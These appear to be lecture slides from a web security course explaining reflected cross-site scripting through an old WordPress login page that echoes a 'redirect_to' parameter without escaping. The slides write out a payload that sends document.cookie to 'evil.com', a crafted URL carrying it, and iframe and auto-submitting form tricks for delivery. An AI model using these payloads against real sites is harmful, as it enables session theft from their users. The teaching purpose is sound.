
### reflected XSS example  {.smaller}



* WordPress version 1.2.1 (blog software)
 
```php
<input type="hidden" name="redirect_to"
       value="<?php echo $_GET["redirect_to"] ?>" />

```
 

* `$_GET["redirect_to"]` --- form input 

   * intended to be from hidden field or autogenerated link
   * <code>/login.php?redirect_to=[foo]{style="border 2px solid black"}</code>

 

::: {style="border: 2px solid black; font-face: 'Source Code Pro', monospace"}
 <code>"> \<script>(new Image()).src=<br> 'http://evil.com/'+document.cookie;\</script></code> 
:::



### exploiting reflected XSS (1) 


* how does attacker get <em>target user to make evil request</em> 

::: {style="border: 2px solid black; font-face: 'Source Code Pro', monospace"}
http://example.com/?redirect_to=">\<script>(new<br> Image()).src='http://evil.com'+document.cookie;\<script> 
:::


* just put link/form on any web page, hope user clicks it?


### exploiting reflected XSS (2)  {.smaller}


* iframes: 
```html
<iframe src="https://example.com/?redirect_to= %22%3E%3Cscript%3Enew+Image...">
</iframe>

```
 
 

   * iframe: embed another webpage on webpage
   * example: office hour calendar on our course webpage

* JS can ‘‘click’’ links/forms 
 
```html
<form action="https://example.com/">...</form>
<script>document.forms[0].submit()</script>

```



### aside embedded content  {.smaller}


* it's <em>everywhere</em>
* advertisements --- often loaded from other site
* embedded Twitter widget, Youtube videos, etc.
* newspaper might use externally hosted comments
* JavaScript libraries hosted elsewhere
